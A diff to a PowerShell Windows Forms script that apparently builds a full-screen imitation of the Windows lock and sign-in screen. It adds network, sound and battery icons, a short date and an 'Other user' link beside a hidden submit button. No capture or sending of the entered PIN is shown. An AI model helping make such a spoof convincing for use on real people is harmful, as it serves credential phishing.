@@ -72,7 +72,45 @@ try {
     $dateLabel.AutoSize = $true
     $dateLabel.Location = New-Object System.Drawing.Point(60, 110)
     $overlay.Controls.Add($dateLabel)
+     # Bottom right icons panel
+$iconPanel = New-Object System.Windows.Forms.FlowLayoutPanel
+$iconPanel.FlowDirection = 'RightToLeft'
+$iconPanel.Size = New-Object System.Drawing.Size(350, 40)
+$iconPanel.BackColor = [System.Drawing.Color]::Transparent
+$iconPanel.Location = New-Object System.Drawing.Point($form.ClientSize.Width - 370, $form.ClientSize.Height - 70)
+$overlay.Controls.Add($iconPanel)
 
+# Network icon
+$networkLabel = New-Object System.Windows.Forms.Label
+$networkLabel.Text = '📶'
+$networkLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
+$networkLabel.ForeColor = 'White'
+$networkLabel.AutoSize = $true
+$iconPanel.Controls.Add($networkLabel)
+
+# Sound icon
+$soundLabel = New-Object System.Windows.Forms.Label
+$soundLabel.Text = '🔊'
+$soundLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
+$soundLabel.ForeColor = 'White'
+$soundLabel.AutoSize = $true
+$iconPanel.Controls.Add($soundLabel)
+
+# Battery icon
+$batteryLabel = New-Object System.Windows.Forms.Label
+$batteryLabel.Text = '🔋'
+$batteryLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
+$batteryLabel.ForeColor = 'White'
+$batteryLabel.AutoSize = $true
+$iconPanel.Controls.Add($batteryLabel)
+
+# Short date
+$dateShortLabel = New-Object System.Windows.Forms.Label
+$dateShortLabel.Text = Get-Date -Format 'M/d'
+$dateShortLabel.Font = New-Object System.Drawing.Font('Segoe UI', 12)
+$dateShortLabel.ForeColor = 'White'
+$dateShortLabel.AutoSize = $true
+$iconPanel.Controls.Add($dateShortLabel)    
     # Login Container
     $loginContainer = New-Object System.Windows.Forms.Panel
     $loginContainer.Size = New-Object System.Drawing.Size(420, 500)
@@ -120,7 +158,16 @@ try {
     $forgotPinLabel.TextAlign = 'MiddleCenter'
     $forgotPinLabel.Cursor = 'Hand'
     $loginContainer.Controls.Add($forgotPinLabel)
-
+# Other user link
+$otherUserLabel = New-Object System.Windows.Forms.Label
+$otherUserLabel.Text = 'Other user'
+$otherUserLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11)
+$otherUserLabel.ForeColor = '#AAAAAA'
+$otherUserLabel.Size = New-Object System.Drawing.Size(420, 30)
+$otherUserLabel.Location = New-Object System.Drawing.Point(0, 460)
+$otherUserLabel.TextAlign = 'MiddleCenter'
+$otherUserLabel.Cursor = 'Hand'
+$loginContainer.Controls.Add($otherUserLabel)
     # Hidden Button for submission
     $submitButton = New-Object System.Windows.Forms.Button
     $submitButton.Size = New-Object System.Drawing.Size(1, 1)
